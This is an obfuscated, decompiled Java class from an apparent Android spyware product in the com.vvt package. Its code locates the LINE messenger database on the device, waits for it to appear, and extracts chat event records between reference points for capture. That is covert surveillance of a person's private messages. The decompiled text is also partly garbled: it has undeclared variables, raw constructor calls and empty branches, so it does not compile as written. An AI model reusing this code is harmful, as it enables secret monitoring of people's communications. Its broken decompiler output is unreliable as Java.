package com.vvt.capture.c.a.b;

import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.c.c;
import com.vvt.capture.c.m;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class b
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  private String c;
  private com.vvt.base.b d;
  
  public b(String paramString, com.vvt.base.b paramb)
  {
    this.c = paramString;
    this.d = paramb;
  }
  
  public g a()
  {
    long l1 = -1;
    boolean bool1 = a;
    if (bool1) {}
    long l2 = 3000L;
    SystemClock.sleep(l2);
    Object localObject1 = m.a();
    Object localObject2;
    if (localObject1 != null)
    {
      String str1 = this.c;
      String str2 = "LINE_DB";
      String str3 = this.d.f();
      String str4 = m.a((String)localObject1, str1, str2, str3);
      bool1 = com.vvt.ag.b.a(str4);
      if (!bool1)
      {
        long l3 = c.b(str4);
        bool1 = false;
        localObject1 = null;
        l2 = l3;
        int j = 0;
        str2 = null;
        for (;;)
        {
          boolean bool3 = l2 < l1;
          if (bool3) {
            break;
          }
          int k = 10;
          if (j >= k) {
            break;
          }
          SystemClock.sleep(6000L);
          long l4 = c.b(str4);
          int i = j + 1;
          j = i;
          l2 = l4;
        }
      }
      l2 = l1;
      localObject2 = this.c;
      String str5 = "LINE_DB";
      m.a((String)localObject2, str5);
    }
    for (;;)
    {
      localObject2 = new com/vvt/base/capture/FxSimpleEventReference;
      ((FxSimpleEventReference)localObject2).<init>();
      localObject1 = Long.valueOf(l2);
      ((FxSimpleEventReference)localObject2).setReference((Long)localObject1);
      boolean bool2 = a;
      if (bool2) {}
      return (g)localObject2;
      l2 = l1;
    }
  }
  
  public List a(int paramInt)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject1 = m.a();
      if (localObject1 != null)
      {
        String str1 = this.c;
        String str2 = "LINE_DB";
        Object localObject2 = this.d;
        localObject2 = ((com.vvt.base.b)localObject2).f();
        str1 = m.a((String)localObject1, str1, str2, (String)localObject2);
        bool = com.vvt.ag.b.a(str1);
        if (!bool)
        {
          long l1 = c.b(str1);
          long l2 = c.a(paramInt, str1);
          long l3 = 1L;
          l2 -= l3;
          localObject1 = this.c;
          com.vvt.base.b localb = this.d;
          localObject1 = c.a((String)localObject1, str1, l2, l1, localb);
          localArrayList.addAll((Collection)localObject1);
        }
        localObject1 = this.c;
        str1 = "LINE_DB";
        m.a((String)localObject1, str1);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject1 = paramg1.getReference();
      localObject1 = (Long)localObject1;
      long l1 = ((Long)localObject1).longValue();
      localObject1 = paramg2.getReference();
      localObject1 = (Long)localObject1;
      long l2 = ((Long)localObject1).longValue();
      localObject1 = m.a();
      if (localObject1 != null)
      {
        String str = this.c;
        Object localObject2 = "LINE_DB";
        Object localObject3 = this.d;
        localObject3 = ((com.vvt.base.b)localObject3).f();
        str = m.a((String)localObject1, str, (String)localObject2, (String)localObject3);
        bool = com.vvt.ag.b.a(str);
        if (!bool)
        {
          localObject1 = this.c;
          localObject2 = this.d;
          localObject1 = c.a((String)localObject1, str, l1, l2, (com.vvt.base.b)localObject2);
          localArrayList.addAll((Collection)localObject1);
        }
        localObject1 = this.c;
        str = "LINE_DB";
        m.a((String)localObject1, str);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/MyUncaughtExceptionHandler/a/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */